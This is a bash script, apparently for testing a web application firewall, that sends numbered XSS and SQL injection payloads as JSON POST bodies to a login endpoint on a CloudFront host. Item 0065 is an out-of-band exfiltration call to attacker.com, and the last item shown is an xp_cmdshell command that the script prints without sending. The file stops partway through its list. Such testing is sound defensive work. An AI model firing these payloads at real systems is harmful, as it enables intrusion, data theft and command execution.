#!/usr/bin/env bash
# POST /rest/user/login with payload in REQUEST BODY (JSON)
# All 344 JuiceShop payloads — sent via curl POST with JSON {"q": <payload>}
# Purpose: baseline POST shape that produced rich verdicts (validate_log_baseline13.json)
# Generated from waf_requirements.yaml

USER_AGENT="dlpaasrngb6ue.cloudfront.net"
HOST="https://dlpaasrngb6ue.cloudfront.net"
URI="/rest/user/login"

echo "=== juiceshop-0001 | tuning=xss | method=POST-body ==="
printf '    payload: %s\n' '<script>alert(1)</script>'
curl -sk -i -m 15 -X POST "$HOST$URI" -H 'Content-Type: application/json' -H "User-Agent: $USER_AGENT" -d '{"q": "<script>alert(1)</script>"}' | head -8
echo
echo "=== juiceshop-0002 | tuning=xss | method=POST-body ==="
printf '    payload: %s\n' '%253Cscript%253Ealert(1)%253C/script%253E'
curl -sk -i -m 15 -X POST "$HOST$URI" -H 'Content-Type: application/json' -H "User-Agent: $USER_AGENT" -d '{"q": "%253Cscript%253Ealert(1)%253C/script%253E"}' | head -8
echo
echo "=== juiceshop-0003 | tuning=xss | method=POST-body ==="
printf '    payload: %s\n' '&lt;script&gt;alert(1)&lt;/script&gt;'
curl -sk -i -m 15 -X POST "$HOST$URI" -H 'Content-Type: application/json' -H "User-Agent: $USER_AGENT" -d '{"q": "&lt;script&gt;alert(1)&lt;/script&gt;"}' | head -8
echo
echo "=== juiceshop-0004 | tuning=xss | method=POST-body ==="
printf '    payload: %s\n' '<scr<script>ipt>alert(1)</scr</script>ipt>'
curl -sk -i -m 15 -X POST "$HOST$URI" -H 'Content-Type: application/json' -H "User-Agent: $USER_AGENT" -d '{"q": "<scr<script>ipt>alert(1)</scr</script>ipt>"}' | head -8
echo
echo "=== juiceshop-0005 | tuning=xss | method=POST-body ==="
printf '    payload: %s\n' '<script>alert&#40;1&#41;</script>'
curl -sk -i -m 15 -X POST "$HOST$URI" -H 'Content-Type: application/json' -H "User-Agent: $USER_AGENT" -d '{"q": "<script>alert&#40;1&#41;</script>"}' | head -8
echo
echo "=== juiceshop-0006 | tuning=xss | method=POST-body ==="
printf '    payload: %s\n' '<script>alert\\x281\\x29</script>'
curl -sk -i -m 15 -X POST "$HOST$URI" -H 'Content-Type: application/json' -H "User-Agent: $USER_AGENT" -d '{"q": "<script>alert\\\\x281\\\\x29</script>"}' | head -8
echo
echo "=== juiceshop-0007 | tuning=xss | method=POST-body ==="
printf '    payload: %s\n' '<script>alert\\u00281\\u0029</script>'
curl -sk -i -m 15 -X POST "$HOST$URI" -H 'Content-Type: application/json' -H "User-Agent: $USER_AGENT" -d '{"q": "<script>alert\\\\u00281\\\\u0029</script>"}' | head -8
echo
echo "=== juiceshop-0008 | tuning=xss | method=POST-body ==="
printf '    payload: %s\n' '%u003Cscript%u003Ealert(1)%u003C/script%u003E'
curl -sk -i -m 15 -X POST "$HOST$URI" -H 'Content-Type: application/json' -H "User-Agent: $USER_AGENT" -d '{"q": "%u003Cscript%u003Ealert(1)%u003C/script%u003E"}' | head -8
echo
echo "=== juiceshop-0009 | tuning=xss | method=POST-body ==="
printf '    payload: %s\n' '%3Cscript%3Eeval(String.fromCharCode(97,108,101,114,116,40,49,41))%3C/script%3E'
curl -sk -i -m 15 -X POST "$HOST$URI" -H 'Content-Type: application/json' -H "User-Agent: $USER_AGENT" -d '{"q": "%3Cscript%3Eeval(String.fromCharCode(97,108,101,114,116,40,49,41))%3C/script%3E"}' | head -8
echo
echo "=== juiceshop-0010 | tuning=xss | method=POST-body ==="
printf '    payload: %s\n' '%3cscript%3ealert(1)%3c%2fscript%3e'
curl -sk -i -m 15 -X POST "$HOST$URI" -H 'Content-Type: application/json' -H "User-Agent: $USER_AGENT" -d '{"q": "%3cscript%3ealert(1)%3c%2fscript%3e"}' | head -8
echo
echo "=== juiceshop-0011 | tuning=xss | method=POST-body ==="
printf '    payload: %s\n' '%3Csvg%20onload%3D%22confirm%28document.domain%29%22%3E'
curl -sk -i -m 15 -X POST "$HOST$URI" -H 'Content-Type: application/json' -H "User-Agent: $USER_AGENT" -d '{"q": "%3Csvg%20onload%3D%22confirm%28document.domain%29%22%3E"}' | head -8
echo
echo "=== juiceshop-0012 | tuning=xss | method=POST-body ==="
printf '    payload: %s\n' '%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E'
curl -sk -i -m 15 -X POST "$HOST$URI" -H 'Content-Type: application/json' -H "User-Agent: $USER_AGENT" -d '{"q": "%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E"}' | head -8
echo
echo "=== juiceshop-0013 | tuning=xss | method=POST-body ==="
printf '    payload: %s\n' '%3Ciframe%20src%3D%22javascript%3Aalert(1)%22%3E'
curl -sk -i -m 15 -X POST "$HOST$URI" -H 'Content-Type: application/json' -H "User-Agent: $USER_AGENT" -d '{"q": "%3Ciframe%20src%3D%22javascript%3Aalert(1)%22%3E"}' | head -8
echo
echo "=== juiceshop-0014 | tuning=xss | method=POST-body ==="
printf '    payload: %s\n' '%3Cscrscriptipt%3Ealert%281%29%3C%2Fscrscriptipt%3E'
curl -sk -i -m 15 -X POST "$HOST$URI" -H 'Content-Type: application/json' -H "User-Agent: $USER_AGENT" -d '{"q": "%3Cscrscriptipt%3Ealert%281%29%3C%2Fscrscriptipt%3E"}' | head -8
echo
echo "=== juiceshop-0015 | tuning=xss | method=POST-body ==="
printf '    payload: %s\n' '%u003Cscript%u003Ealert(1)%u003C%2Fscript%u003E'
curl -sk -i -m 15 -X POST "$HOST$URI" -H 'Content-Type: application/json' -H "User-Agent: $USER_AGENT" -d '{"q": "%u003Cscript%u003Ealert(1)%u003C%2Fscript%u003E"}' | head -8
echo
echo "=== juiceshop-0016 | tuning=xss | method=POST-body ==="
printf '    payload: %s\n' '"><script>alert(1)</script>'
curl -sk -i -m 15 -X POST "$HOST$URI" -H 'Content-Type: application/json' -H "User-Agent: $USER_AGENT" -d '{"q": "\"><script>alert(1)</script>"}' | head -8
echo
echo "=== juiceshop-0017 | tuning=xss | method=POST-body ==="
printf '    payload: %s\n' '<svg/onload=alert(1)>'
curl -sk -i -m 15 -X POST "$HOST$URI" -H 'Content-Type: application/json' -H "User-Agent: $USER_AGENT" -d '{"q": "<svg/onload=alert(1)>"}' | head -8
echo
echo "=== juiceshop-0018 | tuning=xss | method=POST-body ==="
printf '    payload: %s\n' '<iframe src="javascript:alert(1)">'
curl -sk -i -m 15 -X POST "$HOST$URI" -H 'Content-Type: application/json' -H "User-Agent: $USER_AGENT" -d '{"q": "<iframe src=\"javascript:alert(1)\">"}' | head -8
echo
echo "=== juiceshop-0019 | tuning=xss | method=POST-body ==="
printf '    payload: %s\n' '<IMG SRC="javascript:alert('\''XSS'\'');">'
curl -sk -i -m 15 -X POST "$HOST$URI" -H 'Content-Type: application/json' -H "User-Agent: $USER_AGENT" -d '{"q": "<IMG SRC=\"javascript:alert('\''XSS'\'');\">"}' | head -8
echo
echo "=== juiceshop-0020 | tuning=xss | method=POST-body ==="
printf '    payload: %s\n' '<svg><script xlink:href=data:,alert(1)>'
curl -sk -i -m 15 -X POST "$HOST$URI" -H 'Content-Type: application/json' -H "User-Agent: $USER_AGENT" -d '{"q": "<svg><script xlink:href=data:,alert(1)>"}' | head -8
echo
echo "=== juiceshop-0021 | tuning=xss | method=POST-body ==="
printf '    payload: %s\n' '<math><mi//xlink:href="data:x,alert(1)">'
curl -sk -i -m 15 -X POST "$HOST$URI" -H 'Content-Type: application/json' -H "User-Agent: $USER_AGENT" -d '{"q": "<math><mi//xlink:href=\"data:x,alert(1)\">"}' | head -8
echo
echo "=== juiceshop-0022 | tuning=xss | method=POST-body ==="
printf '    payload: %s\n' '<script>window </script>'
curl -sk -i -m 15 -X POST "$HOST$URI" -H 'Content-Type: application/json' -H "User-Agent: $USER_AGENT" -d '{"q": "<script>window </script>"}' | head -8
echo
echo "=== juiceshop-0023 | tuning=xss | method=POST-body ==="
printf '    payload: %s\n' '"><img src=x onerror=alert(1)>'
curl -sk -i -m 15 -X POST "$HOST$URI" -H 'Content-Type: application/json' -H "User-Agent: $USER_AGENT" -d '{"q": "\"><img src=x onerror=alert(1)>"}' | head -8
echo
echo "=== juiceshop-0024 | tuning=xss | method=POST-body ==="
printf '    payload: %s\n' '%3Cscript%3Ealert%281%29%3C%2Fscript%3E'
curl -sk -i -m 15 -X POST "$HOST$URI" -H 'Content-Type: application/json' -H "User-Agent: $USER_AGENT" -d '{"q": "%3Cscript%3Ealert%281%29%3C%2Fscript%3E"}' | head -8
echo
echo "=== juiceshop-0025 | tuning=xss | method=POST-body ==="
printf '    payload: %s\n' '%22%3E%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E'
curl -sk -i -m 15 -X POST "$HOST$URI" -H 'Content-Type: application/json' -H "User-Agent: $USER_AGENT" -d '{"q": "%22%3E%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E"}' | head -8
echo
echo "=== juiceshop-0026 | tuning=xss | method=POST-body ==="
printf '    payload: %s\n' '<scr<script>ipt>alert(1)</script>'
curl -sk -i -m 15 -X POST "$HOST$URI" -H 'Content-Type: application/json' -H "User-Agent: $USER_AGENT" -d '{"q": "<scr<script>ipt>alert(1)</script>"}' | head -8
echo
echo "=== juiceshop-0027 | tuning=xss | method=POST-body ==="
printf '    payload: %s\n' '<scri%00pt>alert(1)</scri%00pt>'
curl -sk -i -m 15 -X POST "$HOST$URI" -H 'Content-Type: application/json' -H "User-Agent: $USER_AGENT" -d '{"q": "<scri%00pt>alert(1)</scri%00pt>"}' | head -8
echo
echo "=== juiceshop-0028 | tuning=xss | method=POST-body ==="
printf '    payload: %s\n' '<script>\\u0061lert(1)</script>'
curl -sk -i -m 15 -X POST "$HOST$URI" -H 'Content-Type: application/json' -H "User-Agent: $USER_AGENT" -d '{"q": "<script>\\\\u0061lert(1)</script>"}' | head -8
echo
echo "=== juiceshop-0029 | tuning=xss | method=POST-body ==="
printf '    payload: %s\n' '<iframe/src=javascript:alert(1)>'
curl -sk -i -m 15 -X POST "$HOST$URI" -H 'Content-Type: application/json' -H "User-Agent: $USER_AGENT" -d '{"q": "<iframe/src=javascript:alert(1)>"}' | head -8
echo
echo "=== juiceshop-0030 | tuning=xss | method=POST-body ==="
printf '    payload: %s\n' '<svg%0Aonload=alert(1)>'
curl -sk -i -m 15 -X POST "$HOST$URI" -H 'Content-Type: application/json' -H "User-Agent: $USER_AGENT" -d '{"q": "<svg%0Aonload=alert(1)>"}' | head -8
echo
echo "=== juiceshop-0031 | tuning=xss | method=POST-body ==="
printf '    payload: %s\n' '"><img src=x o%6ener%72=alert(1)>'
curl -sk -i -m 15 -X POST "$HOST$URI" -H 'Content-Type: application/json' -H "User-Agent: $USER_AGENT" -d '{"q": "\"><img src=x o%6ener%72=alert(1)>"}' | head -8
echo
echo "=== juiceshop-0032 | tuning=xss | method=POST-body ==="
printf '    payload: %s\n' '%3Cscript%3Ealert(1)%3C%2Fscript%3E'
curl -sk -i -m 15 -X POST "$HOST$URI" -H 'Content-Type: application/json' -H "User-Agent: $USER_AGENT" -d '{"q": "%3Cscript%3Ealert(1)%3C%2Fscript%3E"}' | head -8
echo
echo "=== juiceshop-0033 | tuning=xss | method=POST-body ==="
printf '    payload: %s\n' '%3Csvg%2Fonload%3Dalert(1)%3E'
curl -sk -i -m 15 -X POST "$HOST$URI" -H 'Content-Type: application/json' -H "User-Agent: $USER_AGENT" -d '{"q": "%3Csvg%2Fonload%3Dalert(1)%3E"}' | head -8
echo
echo "=== juiceshop-0034 | tuning=xss | method=POST-body ==="
printf '    payload: %s\n' '<img src=x onerror=alert(1)>'
curl -sk -i -m 15 -X POST "$HOST$URI" -H 'Content-Type: application/json' -H "User-Agent: $USER_AGENT" -d '{"q": "<img src=x onerror=alert(1)>"}' | head -8
echo
echo "=== juiceshop-0035 | tuning=xss | method=POST-body ==="
printf '    payload: %s\n' '&lt;img src=x onerror=alert(1)&gt;'
curl -sk -i -m 15 -X POST "$HOST$URI" -H 'Content-Type: application/json' -H "User-Agent: $USER_AGENT" -d '{"q": "&lt;img src=x onerror=alert(1)&gt;"}' | head -8
echo
echo "=== juiceshop-0036 | tuning=base64 | method=POST-body ==="
printf '    payload: %s\n' 'PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=='
curl -sk -i -m 15 -X POST "$HOST$URI" -H 'Content-Type: application/json' -H "User-Agent: $USER_AGENT" -d '{"q": "PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="}' | head -8
echo
echo "=== juiceshop-0037 | tuning=xss | method=POST-body ==="
printf '    payload: %s\n' '<scr<!-- -->ipt>alert(1)</scr<!-- -->ipt>'
curl -sk -i -m 15 -X POST "$HOST$URI" -H 'Content-Type: application/json' -H "User-Agent: $USER_AGENT" -d '{"q": "<scr<!-- -->ipt>alert(1)</scr<!-- -->ipt>"}' | head -8
echo
echo "=== juiceshop-0038 | tuning=xss | method=POST-body ==="
printf '    payload: %s\n' '?a=<scr&b=ipt>alert(1)</script>'
curl -sk -i -m 15 -X POST "$HOST$URI" -H 'Content-Type: application/json' -H "User-Agent: $USER_AGENT" -d '{"q": "?a=<scr&b=ipt>alert(1)</script>"}' | head -8
echo
echo "=== juiceshop-0039 | tuning=xss | method=POST-body ==="
printf '    payload: %s\n' '<scr + ipt>alert(1)</script>'
curl -sk -i -m 15 -X POST "$HOST$URI" -H 'Content-Type: application/json' -H "User-Agent: $USER_AGENT" -d '{"q": "<scr + ipt>alert(1)</script>"}' | head -8
echo
echo "=== juiceshop-0040 | tuning=xss | method=POST-body ==="
printf '    payload: %s\n' '< + script>alert(1)</script>'
curl -sk -i -m 15 -X POST "$HOST$URI" -H 'Content-Type: application/json' -H "User-Agent: $USER_AGENT" -d '{"q": "< + script>alert(1)</script>"}' | head -8
echo
echo "=== juiceshop-0041 | tuning=sqli | method=POST-body ==="
printf '    payload: %s\n' ''\'' OR '\'' + 1=1 + --'
curl -sk -i -m 15 -X POST "$HOST$URI" -H 'Content-Type: application/json' -H "User-Agent: $USER_AGENT" -d '{"q": "'\'' OR '\'' + 1=1 + --"}' | head -8
echo
echo "=== juiceshop-0042 | tuning=sqli | method=POST-body ==="
printf '    payload: %s\n' 'id='\'' OR '\''&id=1=1--'
curl -sk -i -m 15 -X POST "$HOST$URI" -H 'Content-Type: application/json' -H "User-Agent: $USER_AGENT" -d '{"q": "id='\'' OR '\''&id=1=1--"}' | head -8
echo
echo "=== juiceshop-0043 | tuning=sqli | method=POST-body ==="
printf '    payload: %s\n' ''\''/**/OR/**/1=1--'
curl -sk -i -m 15 -X POST "$HOST$URI" -H 'Content-Type: application/json' -H "User-Agent: $USER_AGENT" -d '{"q": "'\''/**/OR/**/1=1--"}' | head -8
echo
echo "=== juiceshop-0044 | tuning=sqli | method=POST-body ==="
printf '    payload: %s\n' ''\'' OR '\''1'\''='\''1'
curl -sk -i -m 15 -X POST "$HOST$URI" -H 'Content-Type: application/json' -H "User-Agent: $USER_AGENT" -d '{"q": "'\'' OR '\''1'\''='\''1"}' | head -8
echo
echo "=== juiceshop-0045 | tuning=sqli | method=POST-body ==="
printf '    payload: %s\n' ''\'' OR 1=1 --'
curl -sk -i -m 15 -X POST "$HOST$URI" -H 'Content-Type: application/json' -H "User-Agent: $USER_AGENT" -d '{"q": "'\'' OR 1=1 --"}' | head -8
echo
echo "=== juiceshop-0046 | tuning=sqli | method=POST-body ==="
printf '    payload: %s\n' ''\'' OR 1=1#'
curl -sk -i -m 15 -X POST "$HOST$URI" -H 'Content-Type: application/json' -H "User-Agent: $USER_AGENT" -d '{"q": "'\'' OR 1=1#"}' | head -8
echo
echo "=== juiceshop-0047 | tuning=sqli | method=POST-body ==="
printf '    payload: %s\n' ''\'') OR ('\''1'\''='\''1'
curl -sk -i -m 15 -X POST "$HOST$URI" -H 'Content-Type: application/json' -H "User-Agent: $USER_AGENT" -d '{"q": "'\'') OR ('\''1'\''='\''1"}' | head -8
echo
echo "=== juiceshop-0048 | tuning=sqli | method=POST-body ==="
printf '    payload: %s\n' 'admin'\'' --'
curl -sk -i -m 15 -X POST "$HOST$URI" -H 'Content-Type: application/json' -H "User-Agent: $USER_AGENT" -d '{"q": "admin'\'' --"}' | head -8
echo
echo "=== juiceshop-0049 | tuning=sqli | method=POST-body ==="
printf '    payload: %s\n' 'admin'\'' #'
curl -sk -i -m 15 -X POST "$HOST$URI" -H 'Content-Type: application/json' -H "User-Agent: $USER_AGENT" -d '{"q": "admin'\'' #"}' | head -8
echo
echo "=== juiceshop-0050 | tuning=sqli | method=POST-body ==="
printf '    payload: %s\n' '%27%20OR%201=1--'
curl -sk -i -m 15 -X POST "$HOST$URI" -H 'Content-Type: application/json' -H "User-Agent: $USER_AGENT" -d '{"q": "%27%20OR%201=1--"}' | head -8
echo
echo "=== juiceshop-0051 | tuning=sqli | method=POST-body ==="
printf '    payload: %s\n' '%27%20OR%20%271%27=%271'
curl -sk -i -m 15 -X POST "$HOST$URI" -H 'Content-Type: application/json' -H "User-Agent: $USER_AGENT" -d '{"q": "%27%20OR%20%271%27=%271"}' | head -8
echo
echo "=== juiceshop-0052 | tuning=sqli | method=POST-body ==="
printf '    payload: %s\n' '%27%20OR%20%271%27=%271%27--'
curl -sk -i -m 15 -X POST "$HOST$URI" -H 'Content-Type: application/json' -H "User-Agent: $USER_AGENT" -d '{"q": "%27%20OR%20%271%27=%271%27--"}' | head -8
echo
echo "=== juiceshop-0053 | tuning=sqli | method=POST-body ==="
printf '    payload: %s\n' '%2527%2520OR%25201%253D1--'
curl -sk -i -m 15 -X POST "$HOST$URI" -H 'Content-Type: application/json' -H "User-Agent: $USER_AGENT" -d '{"q": "%2527%2520OR%25201%253D1--"}' | head -8
echo
echo "=== juiceshop-0054 | tuning=sqli | method=POST-body ==="
printf '    payload: %s\n' '%27OR+1%3D1--'
curl -sk -i -m 15 -X POST "$HOST$URI" -H 'Content-Type: application/json' -H "User-Agent: $USER_AGENT" -d '{"q": "%27OR+1%3D1--"}' | head -8
echo
echo "=== juiceshop-0055 | tuning=sqli | method=POST-body ==="
printf '    payload: %s\n' '%27+OR+1%3D1--'
curl -sk -i -m 15 -X POST "$HOST$URI" -H 'Content-Type: application/json' -H "User-Agent: $USER_AGENT" -d '{"q": "%27+OR+1%3D1--"}' | head -8
echo
echo "=== juiceshop-0056 | tuning=sqli | method=POST-body ==="
printf '    payload: %s\n' '%27--+'
curl -sk -i -m 15 -X POST "$HOST$URI" -H 'Content-Type: application/json' -H "User-Agent: $USER_AGENT" -d '{"q": "%27--+"}' | head -8
echo
echo "=== juiceshop-0057 | tuning=xss | method=POST-body ==="
printf '    payload: %s\n' '%27%23'
curl -sk -i -m 15 -X POST "$HOST$URI" -H 'Content-Type: application/json' -H "User-Agent: $USER_AGENT" -d '{"q": "%27%23"}' | head -8
echo
echo "=== juiceshop-0058 | tuning=xss | method=POST-body ==="
printf '    payload: %s\n' '%2F%2A%2A%2F'
curl -sk -i -m 15 -X POST "$HOST$URI" -H 'Content-Type: application/json' -H "User-Agent: $USER_AGENT" -d '{"q": "%2F%2A%2A%2F"}' | head -8
echo
echo "=== juiceshop-0059 | tuning=sqli | method=POST-body ==="
printf '    payload: %s\n' '%27)%20OR%20(%271%27=%271'
curl -sk -i -m 15 -X POST "$HOST$URI" -H 'Content-Type: application/json' -H "User-Agent: $USER_AGENT" -d '{"q": "%27)%20OR%20(%271%27=%271"}' | head -8
echo
echo "=== juiceshop-0060 | tuning=sqli | method=POST-body ==="
printf '    payload: %s\n' ''\'')%20OR%20('\''1'\''='\''1'
curl -sk -i -m 15 -X POST "$HOST$URI" -H 'Content-Type: application/json' -H "User-Agent: $USER_AGENT" -d '{"q": "'\'')%20OR%20('\''1'\''='\''1"}' | head -8
echo
echo "=== juiceshop-0061 | tuning=sqli | method=POST-body ==="
printf '    payload: %s\n' ''\''||'\''1'\''='\''1'
curl -sk -i -m 15 -X POST "$HOST$URI" -H 'Content-Type: application/json' -H "User-Agent: $USER_AGENT" -d '{"q": "'\''||'\''1'\''='\''1"}' | head -8
echo
echo "=== juiceshop-0062 | tuning=sqli | method=POST-body ==="
printf '    payload: %s\n' '%df'\'' OR 1=1--'
curl -sk -i -m 15 -X POST "$HOST$URI" -H 'Content-Type: application/json' -H "User-Agent: $USER_AGENT" -d '{"q": "%df'\'' OR 1=1--"}' | head -8
echo
echo "=== juiceshop-0063 | tuning=sqli | method=POST-body ==="
printf '    payload: %s\n' ''\'';WAITFOR DELAY '\''0:0:5'\''--'
curl -sk -i -m 15 -X POST "$HOST$URI" -H 'Content-Type: application/json' -H "User-Agent: $USER_AGENT" -d '{"q": "'\'';WAITFOR DELAY '\''0:0:5'\''--"}' | head -8
echo
echo "=== juiceshop-0064 | tuning=sqli | method=POST-body ==="
printf '    payload: %s\n' ''\'' AND SLEEP(5)--'
curl -sk -i -m 15 -X POST "$HOST$URI" -H 'Content-Type: application/json' -H "User-Agent: $USER_AGENT" -d '{"q": "'\'' AND SLEEP(5)--"}' | head -8
echo
echo "=== juiceshop-0065 | tuning=sqli | method=POST-body ==="
printf '    payload: %s\n' ''\''||UTL_INADDR.get_host_address('\''attacker.com'\'')||'\'''
curl -sk -i -m 15 -X POST "$HOST$URI" -H 'Content-Type: application/json' -H "User-Agent: $USER_AGENT" -d '{"q": "'\''||UTL_INADDR.get_host_address('\''attacker.com'\'')||'\''"}' | head -8
echo
echo "=== juiceshop-0066 | tuning=sqli | method=POST-body ==="
printf '    payload: %s\n' '%27%20OR%201%3D1%20--%20'
curl -sk -i -m 15 -X POST "$HOST$URI" -H 'Content-Type: application/json' -H "User-Agent: $USER_AGENT" -d '{"q": "%27%20OR%201%3D1%20--%20"}' | head -8
echo
echo "=== juiceshop-0067 | tuning=sqli | method=POST-body ==="
printf '    payload: %s\n' '%27)%20OR%20('\''1'\''%3D'\''1'
curl -sk -i -m 15 -X POST "$HOST$URI" -H 'Content-Type: application/json' -H "User-Agent: $USER_AGENT" -d '{"q": "%27)%20OR%20('\''1'\''%3D'\''1"}' | head -8
echo
echo "=== juiceshop-0068 | tuning=sqli | method=POST-body ==="
printf '    payload: %s\n' '%25%27%20OR%20%271%27%3D%271'
curl -sk -i -m 15 -X POST "$HOST$URI" -H 'Content-Type: application/json' -H "User-Agent: $USER_AGENT" -d '{"q": "%25%27%20OR%20%271%27%3D%271"}' | head -8
echo
echo "=== juiceshop-0069 | tuning=sqli | method=POST-body ==="
printf '    payload: %s\n' '%27%20OR%201=1%20--%20'
curl -sk -i -m 15 -X POST "$HOST$URI" -H 'Content-Type: application/json' -H "User-Agent: $USER_AGENT" -d '{"q": "%27%20OR%201=1%20--%20"}' | head -8
echo
echo "=== juiceshop-0070 | tuning=sqli | method=POST-body ==="
printf '    payload: %s\n' '%27%20UNION%20SELECT%201,2,3--'
curl -sk -i -m 15 -X POST "$HOST$URI" -H 'Content-Type: application/json' -H "User-Agent: $USER_AGENT" -d '{"q": "%27%20UNION%20SELECT%201,2,3--"}' | head -8
echo
echo "=== juiceshop-0071 | tuning=sqli | method=POST-body ==="
printf '    payload: %s\n' 'admin%27--+'
curl -sk -i -m 15 -X POST "$HOST$URI" -H 'Content-Type: application/json' -H "User-Agent: $USER_AGENT" -d '{"q": "admin%27--+"}' | head -8
echo
echo "=== juiceshop-0072 | tuning=sqli | method=POST-body ==="
printf '    payload: %s\n' 'admin%27%2f%2a%2a%2f--'
curl -sk -i -m 15 -X POST "$HOST$URI" -H 'Content-Type: application/json' -H "User-Agent: $USER_AGENT" -d '{"q": "admin%27%2f%2a%2a%2f--"}' | head -8
echo
echo "=== juiceshop-0073 | tuning=sqli | method=POST-body ==="
printf '    payload: %s\n' '%27/**/OR/**/1=1--'
curl -sk -i -m 15 -X POST "$HOST$URI" -H 'Content-Type: application/json' -H "User-Agent: $USER_AGENT" -d '{"q": "%27/**/OR/**/1=1--"}' | head -8
echo
echo "=== juiceshop-0074 | tuning=sqli | method=POST-body ==="
printf '    payload: %s\n' '%27%2bOR%2b1%3d1--'
curl -sk -i -m 15 -X POST "$HOST$URI" -H 'Content-Type: application/json' -H "User-Agent: $USER_AGENT" -d '{"q": "%27%2bOR%2b1%3d1--"}' | head -8
echo
echo "=== juiceshop-0075 | tuning=sqli | method=POST-body ==="
printf '    payload: %s\n' '%60%27%20OR%201=1--'
curl -sk -i -m 15 -X POST "$HOST$URI" -H 'Content-Type: application/json' -H "User-Agent: $USER_AGENT" -d '{"q": "%60%27%20OR%201=1--"}' | head -8
echo
echo "=== juiceshop-0076 | tuning=sqli | method=POST-body ==="
printf '    payload: %s\n' '%2527%2520OR%25201%253D1--+'
curl -sk -i -m 15 -X POST "$HOST$URI" -H 'Content-Type: application/json' -H "User-Agent: $USER_AGENT" -d '{"q": "%2527%2520OR%25201%253D1--+"}' | head -8
echo
echo "=== juiceshop-0077 | tuning=sqli | method=POST-body ==="
printf '    payload: %s\n' '%27%2b%4f%52%2b1%3d1--+'
curl -sk -i -m 15 -X POST "$HOST$URI" -H 'Content-Type: application/json' -H "User-Agent: $USER_AGENT" -d '{"q": "%27%2b%4f%52%2b1%3d1--+"}' | head -8
echo
echo "=== juiceshop-0078 | tuning=sqli | method=POST-body ==="
printf '    payload: %s\n' '%2527%2f%2a%2a%2f%2bOR%2b1%3D1--+'
curl -sk -i -m 15 -X POST "$HOST$URI" -H 'Content-Type: application/json' -H "User-Agent: $USER_AGENT" -d '{"q": "%2527%2f%2a%2a%2f%2bOR%2b1%3D1--+"}' | head -8
echo
echo "=== juiceshop-0079 | tuning=sqli | method=POST-body ==="
printf '    payload: %s\n' '%27||CHR(65)||CHR(66)||CHR(67)--'
curl -sk -i -m 15 -X POST "$HOST$URI" -H 'Content-Type: application/json' -H "User-Agent: $USER_AGENT" -d '{"q": "%27||CHR(65)||CHR(66)||CHR(67)--"}' | head -8
echo
echo "=== juiceshop-0080 | tuning=sqli | method=POST-body ==="
printf '    payload: %s\n' '0%27%20UNION%20SELECT%20null,null,null--+'
curl -sk -i -m 15 -X POST "$HOST$URI" -H 'Content-Type: application/json' -H "User-Agent: $USER_AGENT" -d '{"q": "0%27%20UNION%20SELECT%20null,null,null--+"}' | head -8
echo
echo "=== juiceshop-0081 | tuning=sqli | method=POST-body ==="
printf '    payload: %s\n' ''\'' OR 1=1--'
curl -sk -i -m 15 -X POST "$HOST$URI" -H 'Content-Type: application/json' -H "User-Agent: $USER_AGENT" -d '{"q": "'\'' OR 1=1--"}' | head -8
echo
echo "=== juiceshop-0082 | tuning=sqli | method=POST-body ==="
printf '    payload: %s\n' '" OR "1"="1'
curl -sk -i -m 15 -X POST "$HOST$URI" -H 'Content-Type: application/json' -H "User-Agent: $USER_AGENT" -d '{"q": "\" OR \"1\"=\"1"}' | head -8
echo
echo "=== juiceshop-0083 | tuning=sqli | method=POST-body ==="
printf '    payload: %s\n' ''\'')--'
curl -sk -i -m 15 -X POST "$HOST$URI" -H 'Content-Type: application/json' -H "User-Agent: $USER_AGENT" -d '{"q": "'\'')--"}' | head -8
echo
echo "=== juiceshop-0084 | tuning=sqli | method=POST-body ==="
printf '    payload: %s\n' ''\'' UNION SELECT null,null--'
curl -sk -i -m 15 -X POST "$HOST$URI" -H 'Content-Type: application/json' -H "User-Agent: $USER_AGENT" -d '{"q": "'\'' UNION SELECT null,null--"}' | head -8
echo
echo "=== juiceshop-0085 | tuning=sqli | method=POST-body ==="
printf '    payload: %s\n' ''\'' AND 1=CAST((SELECT @@version) AS int)--'
curl -sk -i -m 15 -X POST "$HOST$URI" -H 'Content-Type: application/json' -H "User-Agent: $USER_AGENT" -d '{"q": "'\'' AND 1=CAST((SELECT @@version) AS int)--"}' | head -8
echo
echo "=== juiceshop-0086 | tuning=sqli | method=POST-body ==="
printf '    payload: %s\n' ''\'' AND EXISTS (SELECT * FROM'
curl -sk -i -m 15 -X POST "$HOST$URI" -H 'Content-Type: application/json' -H "User-Agent: $USER_AGENT" -d '{"q": "'\'' AND EXISTS (SELECT * FROM"}' | head -8
echo
echo "=== juiceshop-0087 | tuning=sqli | method=POST-body ==="
printf '    payload: %s\n' '1'\'' AND '\''1'\''='\''1'
curl -sk -i -m 15 -X POST "$HOST$URI" -H 'Content-Type: application/json' -H "User-Agent: $USER_AGENT" -d '{"q": "1'\'' AND '\''1'\''='\''1"}' | head -8
echo
echo "=== juiceshop-0088 | tuning=sqli | method=POST-body ==="
printf '    payload: %s\n' 'admin'\''--'
curl -sk -i -m 15 -X POST "$HOST$URI" -H 'Content-Type: application/json' -H "User-Agent: $USER_AGENT" -d '{"q": "admin'\''--"}' | head -8
echo
echo "=== juiceshop-0089 | tuning=sqli | method=POST-body ==="
printf '    payload: %s\n' ''\'' OR '\''a'\''='\''a'
curl -sk -i -m 15 -X POST "$HOST$URI" -H 'Content-Type: application/json' -H "User-Agent: $USER_AGENT" -d '{"q": "'\'' OR '\''a'\''='\''a"}' | head -8
echo
echo "=== juiceshop-0090 | tuning=sqli | method=POST-body ==="
printf '    payload: %s\n' '1=1'
curl -sk -i -m 15 -X POST "$HOST$URI" -H 'Content-Type: application/json' -H "User-Agent: $USER_AGENT" -d '{"q": "1=1"}' | head -8
echo
echo "=== juiceshop-0091 | tuning=sqli | method=POST-body ==="
printf '    payload: %s\n' '1'\'' AND 1=0 UNION SELECT null, version() --'
curl -sk -i -m 15 -X POST "$HOST$URI" -H 'Content-Type: application/json' -H "User-Agent: $USER_AGENT" -d '{"q": "1'\'' AND 1=0 UNION SELECT null, version() --"}' | head -8
echo
echo "=== juiceshop-0092 | tuning=sqli | method=POST-body ==="
printf '    payload: %s\n' '1'\''; EXEC xp_cmdshell('\''whoami'\'') --'
